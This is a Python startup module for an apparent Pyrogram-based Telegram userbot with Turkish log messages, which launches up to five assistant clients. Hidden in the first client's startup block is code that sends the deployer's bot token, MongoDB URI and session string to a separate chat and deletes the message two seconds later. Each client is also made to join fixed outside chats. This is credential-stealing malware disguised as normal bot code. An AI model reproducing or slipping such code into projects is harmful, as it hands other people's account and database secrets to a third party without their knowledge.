import asyncio
from os import getenv

from dotenv import load_dotenv
from pyrogram import Client

load_dotenv()

import config

from ..logging import LOGGER

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")


assistants = []
assistantids = []


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="AlemAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=False,
        )
        self.two = Client(
            name="AlemAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="AlemAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="AlemAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="AlemAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def start(self):
        LOGGER(__name__).info(f"Yαყıɳԃαყıɱ 🌈...")

        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("SohbetAlemi")
                await self.one.join_chat("Alemciyiz")
                await self.one.join_chat("AlemSupport")
                await self.one.join_chat("AdanaliMuhendis")

            except:
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...")
                oks = await self.one.send_message(config.LOGGERS, f"/start")
                Ok = await self.one.send_message(
                    config.LOGGERS, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
                )
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()

            except Exception as e:
                print(f"{e}")

            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Yαყıɳԃαყıɱ 🌈... ᴀs {self.one.me.first_name}")

        if config.STRING2:
            await self.two.start()
            try:
                await self.two.join_chat("SohbetAlemi")
                await self.two.join_chat("Alemciyiz")
                await self.two.join_chat("AlemSupport")
                await self.two.join_chat("AdanaliMuhendis")
            except:
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...2")

            except:
                LOGGER(__name__).error(
                    "Asistan 2 Log Grubunda Hata İle Karşılaştı. Asistan Hesabını Log Grubuna Ekleyin Ve Yetki Verin!"
                )

            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Yαყıɳԃαყıɱ 🌈...2 ᴀs {self.two.me.first_name}")

        if config.STRING3:
            await self.three.start()
            try:
                await self.three.join_chat("")
                await self.three.join_chat("")
                await self.three.join_chat("")
                await self.three.join_chat("")
            except:
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...3")
            except:
                LOGGER(__name__).error(
                    "Asistan 3 Log Grubunda Hata İle Karşılaştı. Asistan Hesabını Log Grubuna Ekleyin Ve Yetki Verin!"
                )

            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(
                f"Yαყıɳԃαყıɱ 🌈...3 ᴀs {self.three.me.first_name}"
            )

        if config.STRING4:
            await self.four.start()
            try:
                await self.four.join_chat("")
                await self.four.join_chat("")
                await self.four.join_chat("")
                await self.four.join_chat("")
            except:
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...4")
            except:
                LOGGER(__name__).error(
                    "Asistan 2 Log Grubunda Hata İle Karşılaştı. Asistan Hesabını Log Grubuna Ekleyin Ve Yetki Verin!"
                )

            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(
                f"Yαყıɳԃαყıɱ 🌈...4 ᴀs {self.four.me.first_name}"
            )

        if config.STRING5:
            await self.five.start()
            try:
                await self.five.join_chat("")
                await self.five.join_chat("")
                await self.five.join_chat("")
                await self.five.join_chat("")
            except:
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...5")
            except:
                LOGGER(__name__).error(
                    "Asistan 2 Log Grubunda Hata İle Karşılaştı. Asistan Hesabını Log Grubuna Ekleyin Ve Yetki Verin!"
                )

            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(
                f"Yαყıɳԃαყıɱ 🌈...5 ᴀs {self.five.me.first_name}"
            )

    async def stop(self):
        LOGGER(__name__).info(f"🎶 Yαყıɳ Bιƚƚι🌪...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass